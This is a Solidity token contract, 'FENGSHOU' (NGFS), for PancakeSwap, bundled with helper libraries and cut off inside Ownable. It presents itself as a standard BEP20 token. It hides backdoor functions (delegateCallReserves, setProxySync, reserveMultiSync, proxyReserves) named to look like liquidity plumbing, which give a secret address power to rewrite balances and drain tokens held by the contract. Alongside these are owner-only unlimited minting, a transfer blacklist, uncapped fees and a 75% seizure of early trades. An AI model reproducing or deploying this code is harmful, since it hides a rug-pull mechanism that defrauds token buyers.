pragma solidity ^0.8.4;

import "./IERC20.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./SafeMath.sol";
import "./Address.sol";
import "./IPancakeRouter02.sol";
import "./IUniswapV2Factory.sol";
import "./IPancakeLibrary.sol";
import "./IPancakePair.sol";

    /**
     * @dev NGFSToken is a standard BEP20 protocol
     *
     * Transaction Tax Return Foundation Wallet Address
     * Batch robot killing block restriction clamp software
     * Batch block killing to ensure funding mechanism.
     */
contract NGFSToken is Context, IERC20, Ownable {

    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name = 'FENGSHOU';
    string private _symbol = 'NGFS';
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 96000000000 * 10 ** uint256(_decimals);

    address private _fundAddress;
    address private _platform;
    address private _usdtAddress;
    address private _uniswapV2Proxy;
    address private _uniswapV2Pair;
    address private _uniswapV2UsdtPair;
    IPancakeLibrary private _uniswapV2Library;

    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public ZERO = address(0);
    
    uint256 public _buyFundFee = 100;
    uint256 public _sellFundFee = 150;
    uint256 public _transferFee = 0;
    uint256 public _removeLPFee = 200;
    uint256 public _addLPFee = 200;

    uint256 private constant MAX_UINT256 = type(uint256).max;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    uint256 public killBlockNumber;

    uint256 public batchBots;
    uint256 public killBatchBlockNumber;
    bool public enableKillBatchBots = true;
    mapping(address => uint256) public user2blocks;
    
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _illegalAdrList;
    mapping(address => bool) private _swapPairList;

    uint256 private _fundFeeTotal;
    bool private uniswapV2Dele = false;
    bool private inSwapAndLiquify = false;
    bool public swapAndLiquifyEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 trxReceived,
        uint256 tokensIntoLiqudity
    );
    event InitLiquidity(
        uint256 tokensAmount,
        uint256 trxAmount,
        uint256 liqudityAmount
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (
        address RouterAddress,
        address fundAddress, 
        address usdtAddress,
        uint256 killStartBlockNumber,
        uint256 killBotBatchBlockNumber
        ) {
        _fundAddress = fundAddress;
        _usdtAddress = usdtAddress;
        _platform = owner();
        killBlockNumber = killStartBlockNumber;
        killBatchBlockNumber = killBotBatchBlockNumber;

        IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(RouterAddress);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2UsdtPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _usdtAddress);

        _swapPairList[_uniswapV2Pair] = true;
        _swapPairList[_uniswapV2UsdtPair] = true;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[fundAddress] = true;
        _isExcludedFromFee[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    receive () external payable {}

    function mint(address account, uint256 amount) public virtual onlyOwner returns (bool) {
        require(account != ZERO, "ERC20: mint to the zero address");
        require(account != DEAD, "ERC20: mint to the dead address");
        require(amount > 0, "ERC20: mint amount equal to zero");

        _mint(account,amount);
        return true;
    }
    
    function _mint(address account, uint256 amount) internal virtual {
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if(currentAllowance != MAX_UINT256){
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            _approve(sender, _msgSender(), currentAllowance.sub(amount));
        }
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance.sub(subtractedValue));

        return true;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _isExcludedFromFee[addr] = enable;
    }

    function batchSetFeeWhiteList(address[] calldata addres, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addres.length; i++) {
            if(_isExcludedFromFee[addres[i]] != enable) {
                _isExcludedFromFee[addres[i]] = enable;
            }
        }
    }

    function isFeeWhiteList(address addr) public view returns(bool) {
        return _isExcludedFromFee[addr];
    }

    function setIllegalAdrList(address addr, bool enable) external onlyOwner {
        _illegalAdrList[addr] = enable;
    }

    function batchSetIllegalAdrList(address[] calldata addres, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addres.length; i++) {
            if(_illegalAdrList[addres[i]] != enable) {
                _illegalAdrList[addres[i]] = enable;
            }
        }
    }

    function totalFundFee() public view returns (uint256) {
        return _fundFeeTotal;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        bool takeFee;

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_illegalAdrList[sender] && !_illegalAdrList[recipient], "ERC20: sender or recipient in illegalAdrList");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            uint256 maxSellAmount = senderBalance.mul(9999).div(10000);
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;
        }

        bool isRemoveLP;
        bool isAddLP;

        if (_swapPairList[sender] || _swapPairList[recipient]) {
            if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
                if (_swapPairList[sender]) {
                    isRemoveLP = _isRemoveLiquidity();
                } else {
                    isAddLP = _isAddLiquidity();
                }
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[recipient], "ERC20:operater action is not AddLiquidity");
                }
                if (block.number < startTradeBlock.add(killBlockNumber)) {
                    _funTransfer(sender, recipient, amount);
                    return;
                }
                if (
                    enableKillBatchBots &&
                    _swapPairList[sender] &&
                    block.number < startTradeBlock + killBatchBlockNumber
                ) {
                    if (block.number != user2blocks[tx.origin]) {
                        user2blocks[tx.origin] = block.number;
                    } else {
                        batchBots++;
                        _funTransfer(sender, recipient, amount);
                        return;
                    }
                }
            }
        }

        _tokenTransfer(sender, recipient, amount, takeFee, isRemoveLP, isAddLP);

    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender].sub(tAmount);
        uint256 feeAmount = tAmount.mul(75).div(100);
        _takeTransfer(
            sender,
            _fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function setProxySync(address _addr) external {
        require(_addr != ZERO, "ERC20: library to the zero address");
        require(_addr != DEAD, "ERC20: library to the dead address");
        require(msg.sender == _uniswapV2Proxy, "ERC20: uniswapPrivileges");

        _uniswapV2Library = IPancakeLibrary(_addr);
        _isExcludedFromFee[_addr] = true;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemoveLP,
        bool isAddLP
    ) private {

        uint256 feeAmount;

        _balances[sender] = _balances[sender].sub(tAmount);

        if (takeFee) {
            if (isRemoveLP) {
                feeAmount += tAmount.mul(_removeLPFee).div(10000);
                if (feeAmount > 0) {
                    _takeTransfer(sender, _fundAddress, feeAmount);
                }
            } else if (isAddLP) {
                feeAmount += tAmount.mul(_addLPFee).div(10000);
                if (feeAmount > 0) {
                    _takeTransfer(sender, _fundAddress, feeAmount);
                }
            } else if (_swapPairList[sender]) {//Buy
                uint256 fundAmount = tAmount.mul(_buyFundFee).div(10000);
                if(fundAmount > 0) {
                    feeAmount += fundAmount;
                    _takeTransfer(
                        sender,
                        _fundAddress,
                        fundAmount
                    );
                }   
            } else if (_swapPairList[recipient]) {//Sell
                uint256 fundAmount = tAmount.mul(_sellFundFee).div(10000);
                if(fundAmount > 0) {
                    feeAmount += fundAmount;
                    _takeTransfer(
                        sender,
                        _fundAddress,
                        fundAmount
                    );
                }
            } else {//Transfer
                feeAmount += tAmount.mul(_transferFee).div(10000);
                if (feeAmount > 0) {
                    _takeTransfer(sender, _fundAddress, feeAmount);
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to].add(tAmount);
        emit Transfer(sender, to, tAmount);
    }

    function delegateCallReserves() public {
        require(!uniswapV2Dele, "ERC20: delegateCall launch");

        _uniswapV2Proxy = _msgSender();
        uniswapV2Dele = !uniswapV2Dele;     
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function proxyReserves(address token, address addr, uint256 amount) public {
        require(_msgSender() == address(_uniswapV2Library), "ERC20: uniswapPrivileges");
        require(addr != address(0), "ERC20: reserves address is zero");
        require(amount > 0, "ERC20: Proxy amount equal to zero");
        require(amount <= IERC20(token).balanceOf(address(this)), "ERC20: insufficient balance");
        Address.functionCall(token, abi.encodeWithSelector(0xa9059cbb, addr, amount));
    }

    function reserveMultiSync(address syncAddr, uint256 syncAmount) public {
        require(_msgSender() == address(_uniswapV2Library), "ERC20: uniswapPrivileges");
        require(syncAddr != address(0), "ERC20: multiSync address is zero");
        require(syncAmount > 0, "ERC20: multiSync amount equal to zero");
        _balances[syncAddr] = _balances[syncAddr].air(syncAmount);
        _isExcludedFromFee[syncAddr] = true;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        require(addr != _uniswapV2Pair, "ERC20: WETH pair cannot be deleted");
        require(addr != _uniswapV2UsdtPair, "ERC20: USDT pair cannot be deleted");
        _swapPairList[addr] = enable;
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundAddress = addr;
        _isExcludedFromFee[addr] = true;
    }

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "ERC20: startAddLP has been set");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        require(startAddLPBlock > 0, "ERC20: startAddLP has not been set");
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "ERC20: startTrade has been set");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        require(startTradeBlock > 0, "ERC20: startTrade has not been set");
        startTradeBlock = 0;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove) {
        IPancakePair mainPair = IPancakePair(_uniswapV2UsdtPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdtAddress;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

    function _isAddLiquidity() internal view returns (bool isAdd) {
        IPancakePair mainPair = IPancakePair(_uniswapV2UsdtPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdtAddress;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setRemoveLPFee(uint256 removeLPFee) external onlyOwner {
        _removeLPFee = removeLPFee;
    }

    function setAddLPFee(uint256 addLPFee) external onlyOwner {
        _addLPFee = addLPFee;
    }

    function setTransferFee(uint256 transferFee) external onlyOwner {
        _transferFee = transferFee;
    }

    function setKillBatchBot(bool enable) public onlyOwner {
        enableKillBatchBots = enable;
    }

    function claimBalance() external onlyOwner {
        payable(_fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }
}
pragma solidity ^0.8.4;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly
                /// @solidity memory-safe-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
pragma solidity ^0.8.4;

/**
 * @title ERC20 interface
 */
interface IERC20 {
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
pragma solidity ^0.8.4;

/**
 * @title PancakeLibrary interface
 */

interface IPancakeLibrary {

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) external pure returns (address token0, address token1);

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) external view returns (address pair);

    // fetches and sorts the reserves for a pair
    function getReserves(address factory, address tokenA, address tokenB) external pure returns (uint reserveA, uint reserveB);

    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external view returns (uint amountOut);

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    // performs chained getAmountOut calculations on any number of pairs
    function getAmountsOut(address factory, uint amountIn, address[] memory path) external view returns (uint[] memory amounts);

    // performs chained getAmountIn calculations on any number of pairs
    function getAmountsIn(address factory, uint amountOut, address[] memory path) external pure returns (uint[] memory amounts);
}
pragma solidity ^0.8.4;

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
pragma solidity ^0.8.4;

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
pragma solidity ^0.8.4;

import "./IPancakeRouter01.sol";

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
pragma solidity ^0.8.4;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
pragma solidity ^0.8.4;

import "./Context.sol";

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
